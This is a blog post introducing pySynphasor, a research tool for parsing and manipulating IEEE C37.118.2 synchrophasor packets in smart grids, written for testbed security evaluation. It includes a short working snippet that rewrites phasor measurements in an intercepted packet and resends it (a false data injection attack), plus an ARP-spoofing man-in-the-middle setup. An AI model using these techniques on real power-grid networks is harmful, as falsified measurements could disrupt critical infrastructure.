---
title: "pySynphasor: A Python Framework to Analyze, and Secure Synchrophasor Networks"
permalink: pySynphasor-python-based-pmu-packet-analyzer
date: 2025-06-02
excerpt: 
type: Blog
categories: 
tags: 
status:
---


Have you ever wanted to peek into the bytes flying between Phasor Measurement Units (PMUs) and Phasor Data Concentrator (PDC)
What if you could rebuild those packets, inject false data, and test the grid’s resilience against real cyberattacks?
Welcome to pySynphasor , a powerful, open-source Python tool that enables packet-level manipulation of IEEE C37.118.2 messages used in synchrophasor-based smart grids.

---

## What is pySynphasor?

`pySynphasor` is a Python module built on top of [Scapy](https://scapy.net/), tailored for:

- Parsing & building **IEEE C37.118.2** packets
- Injecting **False Data Injection Attacks (FDIA)**
- Running **MITM attacks** via ARP spoofing
- Creating **custom PDCs and µPMUs**

📦 Install it now:

```bash
pip install pySynphasor
```


Full docs + examples: [https://shuvangkardas.com/pySynphasor](https://shuvangkardas.com/pySynphasor)
GitHub Repository: https://github.com/shuvangkardas/pySynphasor

---

## 1. Build a C37.118.2 Command Packet in Python

Let’s start simple,  construct a basic command packet and inspect it.

### Code

```python
from pySynphasor.synphasor import *

cmdPkt = synphasor(type=4, idcode=10) / synphasor_cmd(cmd=5)
cmdPkt.show2()
print("Raw Bytes:", raw(cmdPkt))
```

### Output (Human-readable)

```
###[ IEEE C37.118.2 COMMON FRAME ]###
  synByte= 0xaa
  type= CMD
  version= Version 2
  framesize= 18
  idcode= 10

###[ synphasor command ]###
  cmd= 5
  chk= 0xb6b3
```

### Output (Machine/Raw)

```
Raw Bytes: b'\xaaB\x00\x12\x00\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\xb6\xb3'
```

ust two lines to build a fully valid C37.118 command frame!

---
## 🔍 2. Dissect Real Packets from a Testbed

Captured a packet between a PMU and a PDC? `pySynphasor` will convert it into human-friendly structure.

```python
packet = sniff(count=1)[0]  # Get a packet
packet.show()
```

Output shows layers like:
- Ethernet
- IP/TCP
- IEEE C37.118.2 Common Frame
- Phasor Data (complex numbers)
---

## 3. Inject a False Data Attack (FDIA)

Imagine intercepting a synchrophasor packet and injecting **fake phasor measurements**. Here’s how we did that in our testbed:

### Code

```python
synPkt = packet['synphasor_data']
synPkt.pmu_data[0].phasors[0] = complex(30, 20)
synPkt.pmu_data[0].phasors[1] = complex(70, 80)

del packet[IP].chksum, packet[TCP].chksum
send(packet)
```

### Visual: Before vs After FDIA

|Measurement|Before Attack|After Attack|
|---|---|---|
|Phasor 1|(2453 + 2444j)|(30 + 20j)|
|Phasor 2|(2954 + 2780j)|(70 + 80j)|
|Phasor 3|(2922 + 2079j)|(unchanged in this demo)|

---

## 4. Man-in-the-Middle (MITM) Attack Setup

We deployed 3 VMs: µPMU, pyPDC, and attacker. Using ARP spoofing, we rerouted traffic via the attacker.

### ARP Poisoning Snapshot

|Device|IP|Original MAC|Spoofed MAC|
|---|---|---|---|
|PMU|10.0.2.4|08:00:27:c9:f7:61|08:00:27:a7:1b:c3|
|PDC|10.0.2.7|08:00:27:69:58:64|08:00:27:a7:1b:c3|

---

## pySynphasor vs Other Tools

| Feature                        | pyPMU | pySynphasor ✅ |
| ------------------------------ | ----- | ------------- |
| Build C37.118.2 Packets        | ✅     | ✅             |
| Dissect Captured Packets       | ❌     | ✅             |
| Perform FDIA/MITM              | ❌     | ✅             |
| Includes pyPDC (multi-PMU)     | ❌     | ✅             |
| Scapy-powered for full control | ❌     | ✅             |

---

## 📈 Future Work

We're expanding pySynphasor to:
- Support **IEC 61850-90-5** protocol
- Add **fuzz testing** capabilities
- Build a **GUI dashboard** for researchers


---

## Conclusion

**pySynphasor** is more than a packet tool — it's a testbed enabler, a vulnerability scanner, and a research catalyst for cyber-physical power systems.

🔗 GitHub: [github.com/shuvangkardas/pySynphasor](https://github.com/shuvangkardas/pySynphasor)  
📘 Paper: [Scalable cyber‐physical testbed for cybersecurity evaluation of synchrophasors in power systems](https://ietresearch.onlinelibrary.wiley.com/doi/pdf/10.1049/cps2.12106)
🌐 Docs: [shuvangkardas.com/pySynphasor](https://shuvangkardas.com/pySynphasor)

👉 If this helped you or sparked ideas, don’t forget to ⭐ the repo and share!


## How to cite the paper
1. S. C. Das, T. Vu, H. Ginn, and K. Schoder, "Implementation of IEEE C37. 118 Packet Manipulation Tool, pySynphasor for Power System Security Evaluation," in 2023 IEEE Electric Ship Technologies Symposium (ESTS), 2023, pp. 542-548.
2. S. C. Das and T. Vu, “Scalable Cyber-Physical Testbed for Cybersecurity Evaluation of Synchrophasors in Power Systems,” _arXiv preprint arXiv:2207.12610_, 2022.

## How to contribute
- Please check TODO.md to find out where you can help us.
- Fork this repo.
- Create new branch: git checkout -b fixing-stupid-bug
- Commit changes: git commit -m 'There you go! Fixed the  stupid bug.'
- Push changes to the branch: git push origin fixing-your-stupid-bug
- Submit pull request.

---


---

**Real stories. Practical lessons. Right in your inbox.**  
No spam—just once a week.  
{% include newsletter.html %}

---
### 👋 About Me
Hi, I’m **Shuvangkar Das** — a power systems researcher with a Ph.D. in Electrical Engineering, currently working as a Research Scientist. I work at the intersection of power electronics, inverter-based DERs (IBRs), and AI to help build smarter, greener, and more stable electric grids. 

My work spans large-scale EMT simulations, firmware development, reinforcement learning, and hardware prototyping. Beyond engineering, I’m also a [YouTuber](https://www.youtube.com/@ShuvangkarDas) and content creator — sharing hands-on insights on productivity, research, and knowledge management. My goal is simple: to make complex ideas more accessible and actionable for everyone.

<p><strong>Connect with me:<br></strong>
<a href="https://www.youtube.com/@ShuvangkarDas" target="_blank">
    <img src="https://img.shields.io/badge/YouTube-Subscribe-red?style=for-the-badge&logo=youtube">
  </a>
  <a href="https://www.linkedin.com/in/ShuvangkarDas" target="_blank">
    <img src="https://img.shields.io/badge/LinkedIn-Connect-blue?style=for-the-badge&logo=linkedin">
  </a>
  <a href="https://newsletter.shuvangkardas.com" target="_blank">
    <img src="https://img.shields.io/badge/Newsletter-Subscribe-blue?style=for-the-badge">
  </a>
  <a href="https://twitter.com/shuvangkar_das" target="_blank">
    <img src="https://img.shields.io/badge/Twitter-Follow-blue?style=for-the-badge&logo=twitter">
  </a>
  
  <a href="https://github.com/shuvangkardas" target="_blank">
    <img src="https://img.shields.io/badge/GitHub-Follow-black?style=for-the-badge&logo=github">
  </a>
  <a href="https://blog.shuvangkardas.com" target="_blank">
    <img src="https://img.shields.io/badge/Blog-Read-blueviolet?style=for-the-badge">
  </a>
  
</p>



